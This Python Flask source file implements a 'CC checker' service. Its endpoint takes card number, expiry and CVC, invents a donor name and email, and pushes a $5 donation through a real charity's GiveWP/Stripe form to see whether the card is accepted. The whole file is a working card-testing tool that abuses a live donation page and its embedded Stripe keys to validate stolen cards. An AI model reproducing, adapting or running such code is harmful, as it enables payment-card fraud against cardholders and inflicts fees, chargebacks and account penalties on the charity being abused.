from flask import Flask, request, jsonify
import requests
import random
import string

app = Flask(__name__)

def generate_random_name():
    first_names = ['Harsh', 'John', 'Emily', 'Michael', 'Sarah', 'David', 'Sophia', 'James', 'Olivia']
    last_names = ['Kumar', 'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis']
    return random.choice(first_names), random.choice(last_names)

def generate_random_email(first_name, last_name):
    domains = ['example.com', 'email.com', 'testmail.com', 'randommail.com']
    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
    return f"{first_name.lower()}.{last_name.lower()}{random_string}@{random.choice(domains)}"

@app.route('/checker', methods=['GET'])
def checker():
    cc_details = request.args.get('cc')
    if not cc_details:
        return jsonify({"error": "No credit card details provided."}), 400

    try:
        card_number, exp_month, exp_year, cvc = cc_details.split('|')
    except ValueError:
        return jsonify({"error": "Invalid credit card details format."}), 400

    first_name, last_name = generate_random_name()
    email = generate_random_email(first_name, last_name)

    donation_url = "https://gohtrust.com"
    donation_params = {
        'givewp-route': "donate",
        'givewp-route-signature': "2ad938ffdd2247dfa92d222ec3c809be",
        'givewp-route-signature-id': "givewp-donate",
        'givewp-route-signature-expiration': "1727611301"
    }
    donation_payload = {
        'amount': '5',
        'currency': 'USD',
        'donationType': 'single',
        'formId': '2178',
        'gatewayId': 'stripe_payment_element',
        'firstName': first_name,
        'lastName': last_name,
        'email': email,
        'originUrl': 'https://gohtrust.com/donations/donate/',
        'isEmbed': 'true',
        'embedId': '2178',
        'gatewayData[stripePaymentMethod]': 'card',
        'gatewayData[stripePaymentMethodIsCreditCard]': 'true',
        'gatewayData[formId]': '2178',
        'gatewayData[stripeKey]': 'pk_live_SMtnnvlq4TpJelMdklNha8iD',
        'gatewayData[stripeConnectedAccountId]': 'acct_1ITOtKHWtuqFLE9X'
    }
    donation_headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
        'Accept': "application/json",
        'sec-ch-ua': "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Google Chrome\";v=\"128\"",
        'sec-ch-ua-platform': "\"Android\"",
        'dnt': "1",
        'sec-ch-ua-mobile': "?1",
        'origin': "https://gohtrust.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://gohtrust.com/?givewp-route=donation-form-view&form-id=2178"
    }

    donation_response = requests.post(donation_url, params=donation_params, data=donation_payload, headers=donation_headers)

    try:
        donation_response_data = donation_response.json()
        client_secret = donation_response_data['data']['clientSecret']
    except (ValueError, KeyError):
        return jsonify({"error": "Failed to retrieve client secret from donation response."}), 500

    intent_id = client_secret.split('_')[0] + '_' + client_secret.split('_')[1]

    confirm_url = f"https://api.stripe.com/v1/payment_intents/{intent_id}/confirm"
    confirm_payload = {
        'return_url': 'https://gohtrust.com/donations/donate/?givewp-event=donation-completed&givewp-listener=show-donation-confirmation-receipt&givewp-receipt-id=6020d63ecce1f9a07325061265bd24a2&givewp-embed-id=2178',
        'payment_method_data[billing_details][name]': f'{first_name} {last_name}',
        'payment_method_data[billing_details][email]': email,
        'payment_method_data[billing_details][address][country]': 'IN',
        'payment_method_data[type]': 'card',
        'payment_method_data[card][number]': card_number,
        'payment_method_data[card][cvc]': cvc,
        'payment_method_data[card][exp_year]': exp_year,
        'payment_method_data[card][exp_month]': exp_month,
        'payment_method_data[allow_redisplay]': 'unspecified',
        'payment_method_data[pasted_fields]': 'number',
        'payment_method_data[payment_user_agent]': 'stripe.js/fcb19dd0fc; stripe-js-v3/fcb19dd0fc; payment-element; deferred-intent; autopm',
        'payment_method_data[referrer]': 'https://gohtrust.com',
        'payment_method_data[client_attribution_metadata][client_session_id]': 'e20902d1-e791-4333-ae11-683b18b2920b',
        'payment_method_data[client_attribution_metadata][merchant_integration_source]': 'elements',
        'payment_method_data[client_attribution_metadata][merchant_integration_subtype]': 'payment-element',
        'payment_method_data[client_attribution_metadata][merchant_integration_version]': '2021',
        'payment_method_data[client_attribution_metadata][payment_intent_creation_flow]': 'deferred',
        'payment_method_data[client_attribution_metadata][payment_method_selection_flow]': 'automatic',
        'expected_payment_method_type': 'card',
        'client_context[currency]': 'usd',
        'client_context[mode]': 'payment',
        'use_stripe_sdk': 'true',
        'key': 'pk_live_SMtnnvlq4TpJelMdklNha8iD',
        '_stripe_account': 'acct_1ITOtKHWtuqFLE9X',
        'client_secret': client_secret
    }

    confirm_headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
        'Content-Type': "application/x-www-form-urlencoded",
        'sec-fetch-mode': "cors",
        'stripe-account': 'acct_1ITOtKHWtuqFLE9X'
    }

    confirm_response = requests.post(confirm_url, data=confirm_payload, headers=confirm_headers)

    return jsonify(confirm_response.json())

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
    
